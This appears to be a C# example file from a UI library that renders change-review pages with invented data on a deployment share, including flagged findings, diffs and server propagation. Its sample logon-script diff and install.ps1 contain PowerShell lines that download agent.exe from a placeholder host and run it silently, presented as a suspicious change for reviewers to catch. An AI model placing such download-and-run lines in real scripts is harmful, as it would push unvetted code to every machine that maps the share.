using System.Globalization;
using System.Reflection;
using System.Text;
using CanopyX.Html;
using CanopyX.Rendering;

namespace CanopyX.Examples;

/// <summary>
/// The change views (docs/changes.md) with invented data: a change set on a replicated deployment share, as a change list with flags,
/// details and diffs that open in place, how the change reached six file servers, and a script's diff on its own.
/// changes.html and changes-dark.html put them on one review page; changes-diff-large.html is a diff of 20,000 lines for the windowing;
/// changes-static.html and changes-static-dark.html are the script-free fallbacks for email and print.
/// </summary>
internal static class ChangeViewsExample {
    private static readonly DateTimeOffset Changed = new DateTimeOffset(2026, 10, 21, 10, 42, 0, TimeSpan.Zero);

    internal static void Write(string output) {
        var template = Resource("changes.html");
        var exampleStyle = Resource("examples.css");
        foreach (var theme in new[] { CanopyTheme.Light, CanopyTheme.Dark }) {
            var document = new CanopyHtmlDocument();
            CanopyHtmlOptions Options() => new CanopyHtmlOptions { Theme = theme, Document = document };
            var page = template.Replace("{{style}}", CanopyHtmlAssets.GetStyle(CanopyRuntime.DataGrid))
                .Replace("{{script}}", CanopyHtmlAssets.GetScript(CanopyRuntime.DataGrid))
                .Replace("{{example-style}}", exampleStyle)
                .Replace("{{list}}", List().ToHtmlFragment(Options()))
                .Replace("{{propagation}}", Propagation().ToHtmlFragment(Options()))
                .Replace("{{diff}}", ScriptDiff().ToHtmlFragment(Options()));
            File.WriteAllText(Path.Combine(output, "changes" + (theme == CanopyTheme.Dark ? "-dark" : string.Empty) + ".html"), page, new UTF8Encoding(false));
        }

        Large(20000).SaveHtmlPage(Path.Combine(output, "changes-diff-large.html"), new CanopyHtmlOptions { Title = "A diff of 20,000 lines", Height = "86vh" });
        foreach (var (name, theme, background) in new[] { ("changes-static.html", new CanopyStaticTheme(), "#ffffff"), ("changes-static-dark.html", CanopyStaticTheme.Dark(), "#16181c") }) {
            var options = new CanopyStaticHtmlOptions { Theme = theme, MaxRows = 400 };
            var html = "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>Change views static fallback</title></head><body style=\"font-family:Calibri,Arial,sans-serif;margin:16px;background:" + background + "\">" +
                CanopyStaticHtml.RenderChanges(List(), options) + "<br>" + CanopyStaticHtml.RenderPropagation(Propagation(), options) + "<br>" + CanopyStaticHtml.RenderDiff(ScriptDiff(), options) + "</body></html>";
            File.WriteAllText(Path.Combine(output, name), html, new UTF8Encoding(false));
        }
    }

    /// <summary>The logon script before the change.</summary>
    internal static readonly string LogonBefore = string.Join("\n", new[] {
        "# Maps the department drives at sign-in.",
        "param([string]$Department = $env:DEPARTMENT)",
        "",
        "$shares = @{",
        "    Finance = '\\\\files.example.net\\finance'",
        "    Sales   = '\\\\files.example.net\\sales'",
        "    Support = '\\\\files.example.net\\support'",
        "}",
        "",
        "if (-not $shares.ContainsKey($Department)) {",
        "    Write-Verbose \"No share for $Department\"",
        "    return",
        "}",
        "",
        "New-PSDrive -Name S -PSProvider FileSystem -Root $shares[$Department] -Persist | Out-Null",
        "Write-Verbose \"Mapped S: to $($shares[$Department])\"",
        "",
        "# Printers follow the site.",
        "$site = (Get-ItemProperty 'HKLM:\\Software\\Example' -Name Site).Site",
        "Add-Printer -ConnectionName \"\\\\print-$site.example.net\\Floor1\"",
        "",
        "# Clean up old mappings.",
        "Remove-PSDrive -Name T -ErrorAction SilentlyContinue",
        "Remove-PSDrive -Name U -ErrorAction SilentlyContinue",
        "Write-Verbose 'Done'" }) + "\n";

    /// <summary>The logon script after the change: a new share, a changed printer and a download that runs a file.</summary>
    internal static readonly string LogonAfter = LogonBefore
        .Replace("    Support = '\\\\files.example.net\\support'\n", "    Support = '\\\\files.example.net\\support'\n    Legal   = '\\\\files.example.net\\legal'\n")
        .Replace("Add-Printer -ConnectionName \"\\\\print-$site.example.net\\Floor1\"", "Add-Printer -ConnectionName \"\\\\print-$site.example.net\\Floor2\"")
        .Replace("Write-Verbose 'Done'", "Invoke-WebRequest 'https://updates.example.org/agent.exe' -OutFile \"$env:TEMP\\agent.exe\"\nStart-Process \"$env:TEMP\\agent.exe\" -ArgumentList '/quiet'\nWrite-Verbose 'Done'");

    /// <summary>The logon script's diff, computed here; the browser would compute the same from the texts alone.</summary>
    internal static CanopyTextDiff ScriptDiff() {
        var diff = CanopyTextDiff.FromTexts("logon-diff", "map-drives.ps1", LogonBefore, LogonAfter, compare: true);
        diff.Path = "Scripts/Logon/map-drives.ps1";
        diff.BeforeTitle = "Before · FS01, 10:31 UTC";
        diff.AfterTitle = "After · FS01, 10:42 UTC";
        return diff;
    }

    /// <summary>The change set on the share: two dropped files, two edits, a rename, a removal and an owner change.</summary>
    internal static CanopyChangeList List() {
        var list = new CanopyChangeList("share-changes", "Changes on the deployment share") { ExpandFlagged = false };
        list.Action("copy-unc", "Copy the network path", CanopyChangeActionIcon.Copy, copy: "unc")
            .Action("compare", "Compare across servers", CanopyChangeActionIcon.Compare)
            .Action("acknowledge", "Acknowledge", CanopyChangeActionIcon.Check);
        list.Actions.Add(new CanopyChangeAction("open-diff", "Open the diff") { Icon = CanopyChangeActionIcon.Diff, Reveal = CanopyChangeReveal.Diff });
        list.Actions[2].Reason = true;
        list.Values["share"] = "#share/deploy";
        list.Tool(new CanopyChangeAction("open-share", "Open the share") { Icon = CanopyChangeActionIcon.Open, Link = "share" })
            .Tool(new CanopyChangeAction("expected", "Mark as expected") { Icon = CanopyChangeActionIcon.Check, Reason = true });
        list.Exports = CanopyChangeExports.Csv | CanopyChangeExports.Json;
        string Unc(string path) => "\\\\fs01.example.net\\deploy\\" + path.Replace('/', '\\');
        CanopyChangeItem Add(string id, CanopyChangeKind kind, string path) { var item = list.Add(id, kind, path); item.Values["unc"] = Unc(path); return item; }

        var payload = Add("payload", CanopyChangeKind.Added, "Scripts/Logon/agent.exe");
        payload.Secondary = "Not managed by any setting";
        payload.After = new CanopyChangeVersion { Size = 1_248_256, Hash = "9f2c41d07be35a18c6e0d4f9a2b7c3e15d8f60a4b9c2e7d1f3a5b8c0d2e4f6a8", Time = Changed };
        payload.Flag("unsigned", "Unsigned", "The file has no embedded signature.", CanopyTone.Danger)
            .Flag("unreferenced", "Not referenced", "No setting runs or links to this file.")
            .Flag("executable", "Executable", "Programs dropped on the share run on every computer that maps it.");
        payload.Fact("Owner", null, "EXAMPLE\\svc-build").Fact("Signer", null, "Not signed", CanopyTone.Danger).Fact("File version", null, "4.2.0.17");

        var install = Add("install", CanopyChangeKind.Added, "Scripts/Startup/install.ps1");
        install.After = new CanopyChangeVersion { Size = 412, Hash = "1b7e9a3c5d2f8e0a4c6b9d1e3f5a7c9b2d4e6f8a0c1b3d5e7f9a2c4e6b8d0f1a", Time = Changed.AddSeconds(4) };
        install.Flag("script", "New script", "A script appeared outside the scripts the settings list.").Fact("Owner", null, "EXAMPLE\\svc-build");
        install.Diff = CanopyTextDiff.FromTexts("install-diff", "install.ps1", string.Empty, "# Installs the agent quietly.\nStart-Process \"$PSScriptRoot\\..\\Logon\\agent.exe\" -ArgumentList '/quiet' -Wait\n", compare: true);
        install.Diff.Path = install.Path;

        var logon = Add("logon", CanopyChangeKind.Modified, "Scripts/Logon/map-drives.ps1");
        logon.Before = new CanopyChangeVersion { Size = 1_031, Hash = "4d6f8a0c2e4b6d8f1a3c5e7b9d0f2a4c6e8b1d3f5a7c9e0b2d4f6a8c1e3b5d7f", Time = Changed.AddDays(-12) };
        logon.After = new CanopyChangeVersion { Size = 1_268, Hash = "c3e5a7b9d1f3a5c7e9b0d2f4a6c8e1b3d5f7a9c0e2b4d6f8a1c3e5b7d9f0a2c4", Time = Changed.AddSeconds(-30) };
        logon.Flag("downloads", "Downloads a file", "The script now downloads and runs a program.", CanopyTone.Warning);
        logon.Fact("Owner", "EXAMPLE\\Domain Admins", "EXAMPLE\\Domain Admins");
        logon.Diff = ScriptDiff();

        var settings = Add("settings", CanopyChangeKind.Modified, "Config/settings.ini");
        settings.Before = new CanopyChangeVersion { Size = 612, Hash = "7a9c1e3b5d7f9a2c4e6b8d0f1a3c5e7b9d2f4a6c8e0b1d3f5a7c9e2b4d6f8a0c", Time = Changed.AddDays(-40) };
        settings.After = new CanopyChangeVersion { Size = 618, Hash = "e1b3d5f7a9c2e4b6d8f0a1c3e5b7d9f2a4c6e8b0d1f3a5c7e9b2d4f6a8c0e1b3", Time = Changed.AddSeconds(12) };
        settings.Diff = CanopyTextDiff.FromTexts("settings-diff", "settings.ini", "[agent]\nchannel=stable\ninterval=60\n\n[logging]\nlevel=info\n", "[agent]\nchannel=preview\ninterval=60\n\n[logging]\nlevel=info\n", compare: true);
        settings.Diff.Path = settings.Path;
        settings.Diff.Notes.Add(new CanopyChangeNote("Line endings changed from CRLF to LF."));

        var renamed = Add("cleanup", CanopyChangeKind.Renamed, "Scripts/Logon/cleanup.cmd");
        renamed.PreviousPath = "Scripts/Logon/old-cleanup.cmd";
        renamed.Before = new CanopyChangeVersion { Size = 220, Hash = "5c7e9b1d3f5a7c9e2b4d6f8a0c1e3b5d7f9a2c4e6b8d0f1a3c5e7b9d2f4a6c8e" };
        renamed.After = new CanopyChangeVersion { Size = 220, Hash = "5c7e9b1d3f5a7c9e2b4d6f8a0c1e3b5d7f9a2c4e6b8d0f1a3c5e7b9d2f4a6c8e", Time = Changed.AddSeconds(20) };

        var removed = Add("legacy", CanopyChangeKind.Removed, "Tools/legacy-inventory.vbs");
        removed.Before = new CanopyChangeVersion { Size = 3_904, Hash = "b2d4f6a8c0e1b3d5f7a9c2e4b6d8f0a1c3e5b7d9f2a4c6e8b0d1f3a5c7e9b2d4", Time = Changed.AddDays(-400) };
        removed.Diff = new CanopyTextDiff("legacy-diff", "legacy-inventory.vbs") { Content = CanopyDiffContent.Unavailable, Message = "The earlier text was not kept: files larger than 256 KB are compared by hash." };

        var owner = Add("policy", CanopyChangeKind.Modified, "Config/policy.xml");
        owner.KindLabel = "Owner changed";
        owner.Before = new CanopyChangeVersion { Size = 8_120, Hash = "f0a2c4e6b8d1f3a5c7e9b0d2f4a6c8e1b3d5f7a9c2e4b6d8f0a1c3e5b7d9f2a4" };
        owner.After = new CanopyChangeVersion { Size = 8_120, Hash = "f0a2c4e6b8d1f3a5c7e9b0d2f4a6c8e1b3d5f7a9c2e4b6d8f0a1c3e5b7d9f2a4", Time = Changed.AddSeconds(25) };
        owner.Fact("Owner", "EXAMPLE\\Domain Admins", "EXAMPLE\\jdoe", CanopyTone.Warning);
        owner.Diff = new CanopyTextDiff("policy-diff", "policy.xml") { Content = CanopyDiffContent.Identical, Message = "Only the owner changed; the content is the same on both sides." };
        return list;
    }

    /// <summary>How the change reached six file servers in two sites.</summary>
    internal static CanopyPropagation Propagation() {
        var view = new CanopyPropagation("share-propagation", "Propagation of the change set") {
            Start = Changed, AsOf = Changed.AddMinutes(23), Title = "File server",
            GroupCount = "[one]{count} server[other]{count} servers",
            Summary = "Seen on 3 of 6 file servers. FS05 holds a different agent.exe; FS06 has not reported since 10:20."
        };
        void Add(string id, string site, CanopyPropagationState state, int? seen, int? last, string? note, bool source = false) {
            var witness = view.Witness(id, id.ToUpperInvariant(), state);
            witness.Group = site; witness.Source = source; witness.Note = note;
            witness.FirstSeen = seen.HasValue ? Changed.AddMinutes(seen.Value) : (DateTimeOffset?)null;
            witness.LastSeen = last.HasValue ? Changed.AddMinutes(last.Value) : (DateTimeOffset?)null;
        }

        Add("fs01", "Oslo", CanopyPropagationState.Converged, 0, 22, "The change was first seen here.", source: true);
        Add("fs02", "Oslo", CanopyPropagationState.Converged, 2, 22, "Hashes match.");
        Add("fs03", "Oslo", CanopyPropagationState.Converged, 6, 21, "Hashes match.");
        Add("fs04", "Lyon", CanopyPropagationState.Propagating, null, 20, "Not there yet; within the 30-minute window.");
        Add("fs05", "Lyon", CanopyPropagationState.Fault, 9, 21, "agent.exe differs: 5e1b…92c0.");
        Add("fs06", "Lyon", CanopyPropagationState.Unknown, null, -22, "Not reached since 10:20 UTC.");
        return view;
    }

    /// <summary>A long configuration file with scattered edits, for the windowing.</summary>
    internal static CanopyTextDiff Large(int lines) {
        var before = new StringBuilder();
        var after = new StringBuilder();
        var random = new Random(lines);
        for (var i = 1; i <= lines; i++) {
            var line = "entry." + i.ToString("00000", CultureInfo.InvariantCulture) + " = value-" + (i * 7919 % 10007).ToString(CultureInfo.InvariantCulture);
            before.Append(line).Append('\n');
            var roll = random.Next(400);
            if (roll == 0) continue;
            after.Append(roll == 1 ? line.Replace("value-", "changed-") : line).Append('\n');
            if (roll == 2) after.Append("entry.").Append(i.ToString("00000", CultureInfo.InvariantCulture)).Append("b = added").Append('\n');
        }

        var diff = CanopyTextDiff.FromTexts("large-diff", "settings-export.conf", before.ToString(), after.ToString(), compare: true);
        diff.Path = "Exports/settings-export.conf";
        return diff;
    }

    private static string Resource(string name) {
        using var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CanopyX.Examples.Templates." + name)!;
        using var reader = new StreamReader(stream);
        return reader.ReadToEnd();
    }
}
